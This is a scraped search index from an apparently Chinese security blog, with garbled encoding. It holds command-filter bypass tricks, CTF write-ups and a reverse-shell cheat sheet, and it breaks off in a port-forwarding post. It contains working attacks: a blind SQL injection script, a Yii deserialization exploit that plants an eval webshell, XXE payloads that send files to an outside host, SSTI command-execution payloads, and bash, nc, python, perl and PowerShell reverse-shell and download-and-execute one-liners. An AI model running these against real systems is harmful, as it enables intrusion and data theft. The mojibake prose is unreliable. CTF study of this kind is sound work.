123cat /f`who`la`ks`g åæ–œæ ä¹‹é—´çš„å­—ç¬¦ä¼šä½œä¸ºå‘½ä»¤æ‰§è¡Œw`\\f1hgb`ho`\\f1hgb`am`\\f1hgb`i //è¿™ä¸ªåæ–œçº¿ä½œç”¨å°±æ˜¯å¹³æ—¶çš„é‚£ç§è¿æ¥,åå¼•å·çš„ä½œç”¨æ˜¯æŠŠæ‹¬èµ·æ¥çš„å­—ç¬¦å½“åšå‘½ä»¤æ‰§è¡Œwh$(f1hgb)oa$(f1hgb)mi //å’Œä¸Šé¢çš„å·®ä¸å¤š,éƒ½è¯´æ‰§è¡Œå’Œæ‹¼æ¥ åªå¯ç»•è¿‡æ–‡ä»¶å 1234cat fl[abc]g.php //åŒ¹é…[abc]ä¸­çš„ä»»ä½•ä¸€ä¸ªcat f[a-z]ag.txt //åŒ¹é…a-zèŒƒå›´çš„ä»»ä½•å­—ç¬¦cat fla* //ç”¨*åŒ¹é…ä»»æ„a=f;d=ag;c=l;cat $a$c$d.php è¡¨ç¤ºcat flag.php //å†…è”æ‰§è¡Œ æ–‡ä»¶åç»•è¿‡ 1234åˆ©ç”¨æ­£åˆ™:æ¯”å¦‚è¦è¯»å–etc/passwdcat /???/??????cat /???/pass*cat /etc$u/passwd å‘½ä»¤æ‰§è¡Œå‡½æ•°ç»•è¿‡ 1234567891011system(&quot;cat /etc/passwd&quot;)&lt;=&gt;&quot;\\x73\\x79\\x73\\x74\\x65\\x6d&quot;(&quot;cat /etc/passwd&quot;);&lt;=&gt;(sy.(st).em)(&quot;cat /etc/passwd&quot;);&lt;=&gt;è¿˜å¯ä»¥ç”¨æ³¨é‡Šæ–¹æ³•ç»•è¿‡&quot;system/*fthgb666*/(&quot;cat /etc/passwd);&quot;&lt;=&gt;&quot;system/*fthgb666*/(wh./*fthgb666*/(oa)/*fthgb666*/.mi);&quot;&lt;=&gt;&quot;(sy./*fthgb666*/(st)/*fthgb666*/.em)/*fthgb666*/(wh./*fthgb666*/(oa)/*fthgb666*/.mi);&quot;","link":"/2018/05/03/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/ctf-knowledge-summary/"},{"title":"2021å¹´çº¢å¸½æ¯åˆèµ›ctféƒ¨åˆ†è¯•é¢˜wp","text":"1 ç­¾åˆ° EBCä¸‹è½½æ–‡ä»¶å‘ç°è¯¥æ–‡ä»¶ä¸ºEBCç¼–ç  ä½¿ç”¨kaliè‡ªå¸¦å·¥å…·iconvè§£ç å¾—åˆ°flag Flag{we1c0me_t0_redhat2021} iconv -f EBCDIC-IT -t utf-8 redhat/EBCDIC.txt 2 å¯†ç å­¦-hpcurveè§£å¯†è„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from itertools import productimport structp = 10000000000000001119K = GF(p)R.&lt;x&gt; = K[]; y=xf = y + prod(map(eval, 'yyyyyyy'))C = HyperellipticCurve(f, 0)J = C.jacobian()def get_u_from_out(output, known_input): res = [] for i in range(24): res.append(output[i]^^known_input[i]) res = bytes(res) u0, u1, u2 = struct.unpack(&quot;&lt;QQQ&quot;, res) u = x^3+x^2*u2+x*u1+u0 return udef get_v_from_u(u): Kbar = GF(p^6) Rbar.&lt;t&gt; = Kbar[&quot;t&quot;] u2 = u.change_ring(Rbar) roots = [x[0] for x in u2.roots()] ys = [] for root in roots: ys.append(f(root).sqrt(0,1)) res = [] for perm in product(range(2), repeat=3): poly = Rbar.lagrange_polynomial([(roots[i], ys[i][perm[i]]) for i in range(3)]) if poly[0] in K: res.append(R(poly)) return resdef try_decode(output, u, v): rs = [u[0], u[1], u[2], v[0], v[1], v[2]] otp = struct.pack(&quot;&lt;QQQQQQ&quot;, *rs) plain = [] otp = otp*2 for i in range(len(output)): plain.append(output[i]^^otp[i]) return bytes(plain)output = bytes.fromhex(&quot;66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&quot;)known_input = b&quot;aaaaaaaaaaaaaaaaaaaaflag&quot;u = get_u_from_out(output, known_input)vs = get_v_from_u(u)for v in vs:print(try_decode(output,u,v)) åœ¨çº¿è¿è¡Œsageä»£ç  3 å¯†ç å­¦-primegame123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869exp.py:import mathfrom decimal import *import randomimport structgetcontext().prec = int(100)primes = [2]for i in range(3, 100): f = True for j in primes: if i * i &lt; j: break if i % j == 0: f = False break if f: primes.append(i)keys = []for i in range(len(primes)): keys.append(Decimal(int(primes[i])).ln())arr = []for v in keys: arr.append(int(v * int(16) ** int(64)))# ct = 597952043660446249020184773232983974017780255881942379044454676980646417087515453ct = 425985475047781336789963300910446852783032712598571885345660550546372063410589918def encrypt(res): h = Decimal(int(0)) for i in range(len(keys)): h += res[i] * keys[i] ct = int(h * int(16)**int(64)) return ctdef f(N): ln = len(arr) A = Matrix(ZZ, ln + 1, ln + 1) for i in range(ln): A[i, i] = 1 A[i, ln] = arr[i] // N A[ln, i] = 64 A[ln, ln] = ct // N res = A.LLL() for i in range(ln + 1): flag = True for j in range(ln): if -64 &lt;= res[i][j] &lt; 64: continue flag = False break if flag: vec = [int(v + 64) for v in res[i][:-1]] ret = encrypt(vec) if ret == ct: print(N, bytes(vec)) else: print(&quot;NO&quot;, ret, bytes(vec))for i in range(2, 1000): print(i) f(i) 12345678910111213141516&gt;&gt;&gt; a = [102, 108, 97, 103, 123, 55, 49, 53, 99, 51, 57, 99, 51, 45, 49, 98, 52, 54, 45, 52, 99, 50, 51, 45, 0]&gt;&gt;&gt; flag = ''&gt;&gt;&gt; for i in a:... flag+=chr(i)...&gt;&gt;&gt; flag'flag{715c39c3-1b46-4c23-\\x00'&gt;&gt;&gt; a = [56, 48, 48, 54, 45, 50, 55, 98, 52, 51, 101, 98, 97, 50, 52, 52, 54, 125, 0, 0, 0, 0, 0, 0, 0]&gt;&gt;&gt; flag = ''&gt;&gt;&gt; for i in a:... flag += chr(i)...&gt;&gt;&gt; flag'8006-27b43eba2446}\\x00\\x00\\x00\\x00\\x00\\x00\\x00'flag{715c39c3-1b46-4c23-8006-27b43eba2446} 4 web-web find ité€šè¿‡codeç›´æ¥å†™å…¥phpinfo() http://eci-2zeg1tmyhxfbmpmn6585.cloudeci1.ichunqiu.com:80/?code=&lt;?php phpinfo();?&gt; è¯·æ±‚hack.php findæœç´¢å‘ç°flag flag{f21c9e0c-b8a0-4191-8e69-3580273b9e91} æœ¬æƒ³è¿™é“é¢˜éœ€è¦å†™å…¥shellå®Œæˆå‘½ä»¤æ‰§è¡Œï¼ŒçœŸæ²¡æƒ³åˆ°ç›´æ¥æœç´¢ï¼ŒçœŸæ˜¯å¥½é¢˜ 5 web-æ³¨å…¥æ³¨å…¥è„šæœ¬bool.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import requestsimport stringimport timeimport sysimport urllibs = requests.session()header = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}def getLength(url): return len(s.get(url, headers=header).text)def judgeLength(baseUrl, payload, resLength): for i in range(1000): url = baseUrl + urllib.parse.quote(payload % str(i)) if len(s.get(url, headers=header).text) == resLength: print((&quot;&gt;&quot; * 3) + &quot; &quot; + str(i)) return i return &quot;@&quot;def judgeString(baseUrl, payload, length, resLength): result = '' for i in range(1, length + 1): for c in string.printable: url = baseUrl + urllib.parse.quote(payload % (str(i), str(ord(c)))) if len(s.get(url, headers=header).text) == resLength: result += c print((&quot;&gt;&quot; * 3) + &quot; &quot; + result) break return resultdef getDatabase(url, resLength): payload1 = &quot;&amp;&amp;length(database())=%s&quot; length = judgeLength(url, payload1, resLength) payload2 = &quot;&amp;&amp;ascii(substr(database(),%s,1))=%s&quot; judgeString(url, payload2, int(length), resLength)def getTables(url, resLength): payload1 = &quot;&amp;&amp;length((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()))=%s&quot; length = judgeLength(url, payload1, resLength) payload2 = &quot;&amp;&amp;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),%s,1))=%s&quot; judgeString(url, payload2, int(length), resLength)def getColumns(url, resLength): payload1 = &quot;&amp;&amp;length((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()&amp;&amp;table_name=0x7573657273))=%s&quot; length = judgeLength(url, payload1, resLength) payload2 = &quot;&amp;&amp;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()&amp;&amp;table_name=0x7573657273),%s,1))=%s&quot; judgeString(url, payload2, int(length), resLength)def getResult(url, resLength): payload1 = &quot;&amp;&amp;length((select/**/group_concat(username,password)/**/from/**/users))=%s&quot; length = judgeLength(url, payload1, resLength) payload2 = &quot;&amp;&amp;ascii(substr((select/**/group_concat(username,password)/**/from/**/users),%s,1))=%s&quot; judgeString(url, payload2, int(length), resLength)if __name__ == '__main__': url = &quot;http://eci-2zefc95c45rh9xwew99q.cloudeci1.ichunqiu.com:80/image.php?id=1&quot; length = getLength(url) # getUser(url, length) # getDatabase(url, length) # getTables(url, length) ## images,users # getColumns(url, length) ## username,password getResult(url, length) ## admin xxxå¯èƒ½ä¼šä¸ä¸€æ ·de è·å–ç”¨æˆ·åå¯†ç  admin f7ba3a53d25a376074e36 ç›´æ¥ç™»å½•åå°è·³è½¬è‡³modify.php è¯¥é¡µé¢å­˜åœ¨ssrf ç›´æ¥è¯»æ–‡ä»¶ç›´æ¥è·å–flag file:///flag file:///flag TMDç«èµ›æœ‰éé¢„æœŸè§£ æˆ‘ä¸ç›¸ä¿¡å‡ºé¢˜äººæ•…æ„å¹²çš„ ç”¨å¾¡å‰‘å¯ä»¥ç›´æ¥æ‰«æå‡ºmodify.php ä¸”å¯ä»¥æœªæˆæƒè®¿é—® GG 6 web-frameworkå¾¡å‰‘æ‰«æå»www.zipæºç åŒ…å®¡è®¡å‘ç°æ˜¯ä¸€ä¸ªyiiæ¡†æ¶ï¼Œ ç„¶ååœ¨ç½‘ç«™æ‰¾åˆ°YIIçš„cveæ¼æ´çš„playloadï¼ˆhttps://blog.csdn.net/xuandao_ahfengren/article/details/111259943ï¼‰ï¼Œç„¶åä¿®æ”¹playloadä»£ç ï¼Œç¼–å†™expä»£ç  EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpnamespace yii\\base{ class View{ }}namespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'assert'; $this-&gt;id = 'eval($_REQUEST[&quot;cmd&quot;])'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['close'] = [new CreateAction(), 'run']; } }}namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-&gt;_dataReader = new Generator; } }}namespace{ $a = new yii\\db\\BatchQueryResult; $a-&gt;checkAccess = array(new yii\\base\\View(),&quot;evaluateDynamicContent&quot;); echo base64_encode(serialize(new yii\\db\\BatchQueryResult));}?&gt; ç„¶åå†™å…¥shell 1http://eci-2zeekzpgsy8b4rsdmpvb.cloudeci1.ichunqiu.com/index.php?r=site%2Fabout&amp;message=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjI0OiJhc3NlcnQoJF9SRVFVRVNUWyJjbWQiXSkiO31pOjE7czozOiJydW4iO319fX0=&amp;cmd=die(file_put_contents(%27ab.php%27,%27%3C?php%20eval($_REQUEST[%22cmd%22]);?%3E%27)) å¾—åˆ°ä¸€ä¸ªab.phpçš„ ä½¿ç”¨èšå‰‘é“¾æ¥ï¼Œé“¾æ¥åå‘ç°æœ‰ä¸ªreadflag çš„æ–‡ä»¶ï¼Œä½†æ˜¯æ— æ³•ç›´æ¥è¯»å–æƒé™ä¸º003ï¼Œç›´æ¥ä½¿ç”¨èšå‰‘çš„disable_functionæ’ä»¶å¯ç»•è¿‡è¿›è¡Œäº¤äº’å¼shellè¯»å–å¦‚ä¸‹ flag{c70db8f4-5fda-4981-93ab-45b61efd6703} 7 æ‚é¡¹-colorfulcodedata1ä¸­çš„æ•°æ®èŒƒå›´ä¸º0-19ï¼Œdata2ä¸­çš„å‰60å­—èŠ‚æ•°æ®ä¸åé¢çš„æ•°æ®æ˜æ˜¾ä¸åŒï¼ŒçŒœæµ‹data2ä¸­å‰60å­—èŠ‚ä¸ºåƒç´ ä¿¡æ¯ï¼Œæ¯3å­—èŠ‚ä¸€ä¸ªRGBåƒç´ ç‚¹ï¼Œåˆ™åˆšå¥½20ä¸ªåƒç´ ç‚¹ï¼Œç¼–å·ä¸º0-19ï¼Œæ­£å¥½å¯¹åº”data1ä¸­çš„0-19æ•°æ®ï¼Œä½¿ç”¨è„šæœ¬å°†data1ä¸­çš„æ•°æ®æ›¿æ¢ä¸ºåƒç´ ç‚¹ï¼Œå¹¶åˆ›å»ºæˆä¸€å¼ å›¾ç‰‡ã€‚ data1ä¸­æ•°æ®ä¸º7067å­—èŠ‚ï¼Œå³ä¸€å…±7067ä¸ªåƒç´ ç‚¹ï¼Œåˆ†è§£ä¸ºå®½åº¦é«˜åº¦åªæœ‰ä¸€ä¸ªç»“æœå³37131ï¼ˆæˆ–131*37ï¼‰ ç¼–å†™è„šæœ¬ 12345678910111213141516171819from PIL import Imagea = '0000000000C000FFFF00FF00FFC0FFFFC0C0C0C0FFC0C000FF00FFFF0000C00000C000C0FFFFFFFFFF00FFFFC000C00000C0C0C0FFFFC0FFC00000FF'px = []for i in range(20): tmp = (int(a[i*6:i*6+2],16),int(a[i*6+2:i*6+4],16),int(a[i*6+4:i*6+6],16)) px.append(tmp)print len(px)pic = Image.new('RGB',(37,191))f = open('data1','rb')str1 = f.read()f.close()str1 = str1.split(' ')num = 0for x in range(37): for y in range(191): pic.putpixel((x,y), px[int(str1[num])]) num+=1pic.show()pic.save('xxx.png') æ‰§è¡Œè„šæœ¬å¾—åˆ°å›¾ç‰‡ åœ¨çº¿è¿›è¡Œè½¬æ¢ å¾—åˆ°flag","link":"/2021/05/10/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/ctf-redhat2021/"},{"title":"2022èµ›å®ç½‘å®‰ctfé¢è¯•é¢˜","text":"ç¯å¢ƒåœ°å€12361.147.171.107:1008161.147.171.107:1008261.147.171.107:10083 10081 xmlæ³¨å…¥è®¿é—®æºä»£ç åˆ†æï¼Œæ„Ÿè§‰åº”è¯¥çš„æ˜¯ä¸ªxmlå¤–éƒ¨å®ä½“æ³¨å…¥ å…ˆæ„é€ payloadè¯•ä¸€å“ˆï¼š 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt; ç¡®å®å­˜åœ¨ï¼Œä½†æ˜¯æœ‰è¿‡æ»¤ å°è¯•ä½¿ç”¨å‚æ•°å‹å®ä½“æ–¹å¼æ³¨å…¥ï¼š vpsæ„é€  test.dtd 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.31.79:8888?p=%file;'&gt;&quot;&gt; å¼€å¯ç«¯å£ç›‘å¬ï¼šnc -lvvp 8888 æ”»å‡»payload: 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://139.196.234.164:8899/test.dtd&quot;&gt; %remote;%int;%send;]&gt; æˆåŠŸè¿”å›åŠ å¯†å­—ç¬¦ä¸²ï¼Œè§£å¯†åè·å– ä¿®æ”¹test.dtdè·å–test.phpæºç  12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=test.php&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.31.79:8888?p=%file;'&gt;&quot;&gt; å‘åŒ…è·å–åˆ°æºç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?phperror_reporting(0);function showAttrs($attrs) { $r = [&quot;&quot;]; foreach ($attrs as $k =&gt; $v) { array_push($r, $k . &quot;=\\&quot;&quot; . $v-&gt;textContent . &quot;\\&quot;&quot;); } return implode(&quot; &quot;, $r);}function showNode($n, $pre) { if ($n-&gt;hasChildNodes()) { echo $pre . &quot;&lt;&quot; . $n-&gt;nodeName . showAttrs($n-&gt;attributes) . &quot;&gt;\\n&quot;; foreach ($n-&gt;childNodes as $c) { show($c, $pre . &quot; &quot;); } echo $pre . &quot;&lt;/&quot; . $n-&gt;nodeName . &quot;&gt;\\n&quot;; } else { echo $pre . &quot;&lt;&quot; . $n-&gt;nodeName . showAttrs($n-&gt;attributes) . &quot;/&gt;\\n&quot;; }}function show($n, $pre) { switch ($n-&gt;nodeType) { case XML_ELEMENT_NODE: showNode($n, $pre); break; case XML_TEXT_NODE: case XML_CDATA_SECTION_NODE: case XML_ENTITY_REF_NODE: echo $pre . $n-&gt;textContent . &quot;\\n&quot;; break; case XML_COMMENT_NODE: echo $pre . &quot;&lt;!--&quot; . $n-&gt;textContent . &quot;--&gt;\\n&quot;; break; case XML_DOCUMENT_NODE: foreach ($n-&gt;childNodes as $c) { show($c, $pre); } break; default: echo &quot;Nope&quot;; break; }}if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) { $d = new DOMDocument(); $data = file_get_contents(&quot;php://input&quot;); if(preg_match('/file|rot13/i', $data)) { die('illegal!'); } $d-&gt;loadXML($data, LIBXML_BIGLINES | LIBXML_COMPACT | LIBXML_DTDVALID | LIBXML_NOBLANKS |LIBXML_NOERROR | LIBXML_NOWARNING | LIBXML_NOENT); if ($d-&gt;validate()) { show($d, &quot;&quot;); } else { echo &quot;Ã¨Â¿Â™Ã¥Â¥Â½Ã¥ÂƒÂÃ¤Â¸ÂÃ¦Â˜Â¯Ã¤Â¸ÂªÃ¨Â§Â„Ã¨ÂŒÂƒÃ§ÂšÂ„Ã¨Â¯Â­Ã¥ÂÂ¥Ã¥Â“Â¦&quot;; }} else { echo (&quot;Ã¨Â¯Â·Ã¦Â±Â‚Ã¦Â–Â¹Ã¥Â¼ÂÃ¦ÂœÂ‰Ã¨Â¯Â¯&quot;);} çœ‹äº†ä¸€ä¸‹æºç æ²¡å•¥ä¸œè¥¿ åº”è¯¥ä¸ç”¨æºç å®¡è®¡ï¼ŒçŒœæµ‹flagå¯èƒ½å­˜åœ¨è·¯å¾„ä¸‹ï¼Œä¿®æ”¹test.dtdåŒ…å«ä¸€ä¸‹çœ‹çœ‹ 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.31.79:8888?p=%file;'&gt;&quot;&gt; ç¡®å®æœ‰å€¼ï¼Œè§£å¯†åæˆåŠŸæ‹¿åˆ°flag 1ZmxhZ3tYUE9aVGQ2NkZhQU1zVXNUcng3QzJ2cURCVm1nRXFiYn0K flag:flag{XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb}10082 sstiæ¨¡æ¿æ³¨å…¥è¯·æ±‚è·å–æºç ï¼Œåˆ†ææºç ï¼Œè·å¾—å˜é‡å…¥å£ç‚¹ï¼Œé¦–å…ˆä¼ å‚å˜é‡æ˜¯name, æ„é€ /?name={{4*4}} å‘¦è¥¿ ï¼Œç¡®å®æœ‰sstiï¼ ä¸è¿‡å­˜åœ¨è¿‡æ»¤ï¼Œå‡ ä¹æŠŠèƒ½è¿‡æ»¤çš„ä¸œè¥¿éƒ½è¿‡æ»¤äº†ï¼Œè¿‡æ»¤çš„æ­»æ­»æ»´ 1blackwords = ['class', 'attr', 'mro', 'base', 'request', 'session', 'add', 'chr', 'ord', 'redirect', 'url_for', 'config', 'builtins', 'get_flashed_messages', 'get', 'subclasses', 'form', 'cookies', 'headers', 'local', 'input', 'compile', 'os', 'flag', 'dir', 'eval', 'print', 'and','[', ']', '\\'', '&quot;', '{}', '\\\\', '#', '&lt;', '&gt;', '&amp;', '/', '+'] é‚£å°±ç»•å§ï¼Œæ€ä¹ˆç»•å‘¢ï¼Ÿ è¿™é‡Œå¯ä»¥åˆ©ç”¨çš„ç‚¹å°±æ˜¯ä½¿ç”¨jinja2è‡ªèº«çš„è¿‡æ»¤å™¨è¿›è¡Œbypass 1{% set org = ({ }|select()|string()) %}{{org}} ç¼–å†™è·å–å¯¹åº”å­—ç¬¦ä¸²æœç´¢è„šæœ¬ 1234567891011121314151617#!/usr/local/env python3# -*- coding:utf-8 -*-# author:greetdawnimport requestsurl = &quot;http://61.147.171.107:10082/?name=&quot;payload = &quot;{{% set sstr = ((app.__doc__|string|list).pop({num})|string) %}}{{{{sstr}}}}&quot; for i in range(0, 300): r = requests.get(url + payload.format(num=i)) # print(r.text) if '/' in r.text: print(&quot;[+] paylaod: {}&quot;.format(payload.format(num=i))) break else: print(&quot;search {}&quot;.format(i)) ä¾æ¬¡è·å–æ›´å¤šå­—ç¬¦ 1234567891011121314151617181920212223242526272829{% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}} # _{% set space = (({ }|select|string|list).pop(10)|string) %} # ç©ºæ ¼{% set left = ((app.__doc__|string|list).pop(171)|string) %} {{left}} # ({% set right = ((app.__doc__|string|list).pop(182)|string) %} {{right}} # ){% set yin = ((app.__doc__|string|list).pop(177)|string) %} # å•å¼•å· '{% set point = ((app.__doc__|string|list).pop(26)|string) %} {{point}} # .{% set but = dict(buil=aa,tins=dd)|join %} # builtins{% set imp = dict(imp=aa,ort=dd)|join %}{{imp}} # import{% set pon = dict(po=aa,pen=dd)|join %}{{pon}} # popen{% set os = dict(o=aa,s=dd)|join %}{{os}} # os{% set ca = dict(ca=aa,t=dd)|join %} # cat{% set flg = dict(fl=aa,ag=dd)|join %} # flag{% set ev = dict(ev=aa,al=dd)|join %} # eval{% set red = dict(re=aa,ad=dd)|join %} {{red}} # read{% set bul = xhx*2~but~xhx*2 %} # __builtins__{% set zero = (self|int) %} # 0, ä¹Ÿå¯ä»¥ä½¿ç”¨lenghtè¿‡æ»¤å™¨è·å–æ•°å­—{% set one = (zero**zero)|int %} # 1{% set two = (zero-one-one)|abs %} # 2{% set four = (two*two)|int %} # 4{% set five = (two*two*two)-one-one-one %} # 5{% set three = five-one-one %} # 3{% set nine = (two*two*two*two-five-one-one) %} # 9{% set seven = (zero-one-one-five)|abs %} # 7{% set c = dict(c=aa)|reverse|first %} # å­—ç¬¦ c{% set bfh = self|string|urlencode|first %} # ç™¾åˆ†å· %{% set bfhc = bfh~c %} # è¿™é‡Œæ„é€ äº†%c, ä¹‹åå¯ä»¥åˆ©ç”¨è¿™ä¸ª%cæ„é€ ä»»æ„å­—ç¬¦ã€‚~ç”¨äºå­—ç¬¦è¿æ¥{% set slas = bfhc%((four~seven)|int) %} # ä½¿ç”¨%cæ„é€ æ–œæ  / æ ¹æ®ä»¥ä¸Šè·å–å­—ç¬¦ä¸²è¿›è¡Œæ‹¼æ¥è·å–payload:``__import__(â€™osâ€˜).popen(â€˜cat /flagâ€™).read() 1234567891011121314151617181920212223242526272829http://61.147.171.107:10082/?name={% set zero = (self|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set three = five-one-one %}{% set nine = (two*two*two*two-five-one-one) %}{% set seven = (zero-one-one-five)|abs %}{% set c = dict(c=aa)|reverse|first %}{% set bfh = self|string|urlencode|first %}{% set bfhc = bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set space = (({ }|select|string|list).pop(10)|string) %}{% set yin = ((app.__doc__|string|list).pop(177)|string) %}{% set xhx = (({ }|select|string|list).pop(24)|string) %}{% set left = ((app.__doc__|string|list).pop(171)|string) %}{% set right = ((app.__doc__|string|list).pop(182)|string) %}{% set point = ((app.__doc__|string|list).pop(26)|string) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set exo = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx*2~but~xhx*2 %} {% set pld = xhx*2~imp~xhx*2~left~yin~exo~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{{pld}} å¸¦å…¥ä¸‡èƒ½payloadæ„é€ evalæ‰§è¡Œå‘½ä»¤ 123456789{% for f,v in whoami.__init__.__globals__.items() %} {% if f == bul %} {% for a,b in v.items() %} {% if a == ev %} {{b(pld)}} {% endif %} {% endfor %} {% endif %}{% endfor %} flag : flag{m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS}10083 æ–‡ä»¶åŒ…å«è¯·æ±‚çœ‹æºç ï¼Œå…¸å‹çš„æ–‡ä»¶åŒ…å«ï¼Œä¼ å…¥å˜é‡file1å’Œfile2 payloadï¼š 12file1=php://filter/read=convert.base64-encode/resource=flag.phpfile2=data:text/plain,hello ctf åˆ©ç”¨dataåè®®ä¼ å…¥åŸå§‹æ–‡ä»¶æµï¼Œåˆ©ç”¨php://filteråè®®åŒ…å«flag.phpæ–‡ä»¶æºç  æˆåŠŸè·å–base64å€¼è§£å¯†å¾—flag 12345 PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gZmxhZ3sxbmx1ZGVfYW5kX2cwVF8xVCF9 &lt;?phpecho &quot;WRONG WAY!&quot;;// $flag = flag{1nlude_and_g0T_1T!} flag: flag{1nlude_and_g0T_1T!}","link":"/2022/02/15/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/ctf-wp-saining/"},{"title":"å¸¸è§shellåå¼¹å§¿åŠ¿","text":"Linux123456789101112bash -i &gt;&amp; /dev/tcp/x.x.x.x/port 0&gt;&amp;1 telnet 192.168.217.135 4444 | /bin/bash | telnet 192.168.217.135 5555rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet x.x.x.x 4444 0/tmp/pnc -e -t /bin/bash ip port rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc x.x.x.x 9999 &gt;/tmp/fpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'perl -e 'use Socket;$i=&quot;x.x.x.x&quot;;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;' Windows123nc.exe -e cmd.exe 192.168.217.135 6666powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.217.135 -p 6666 -e cmd å¸¸è§çš„ç•Œé¢å†™å…¥æ–‡ä»¶æ–¹å¼12echo base64_encode(reverse_shell)|base64 -d &gt; /tmp/a.sh |chmod +x /tmp/a.sh|sh /tmp/a.shecho hex_encode(reverse_shell)|xxd -r -p &gt; /tmp/a.sh |chmod +x /tmp/a.sh|sh /tmp/a.sh","link":"/2021/02/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/shell-reverse/"},{"title":"å†…ç½‘æ¸—é€ä¹‹ç«¯å£è½¬å‘","text":"lcx ç«¯å£è½¬å‘åº”ç”¨å…¬ç½‘æœåŠ¡å™¨å¼€å¯ç«¯å£ç›‘å¬./portmap -m 2 -p1 3950 -h2 å…¬ç½‘æœåŠ¡å™¨IP -p2 3951 å¤‡æ³¨ï¼š 1 è¿™é‡Œçš„3950ç«¯å£å’Œ3951ç«¯å£åœ¨å…¬ç½‘IPä¸Šéƒ½æ˜¯æ‰“å¼€çš„ 2 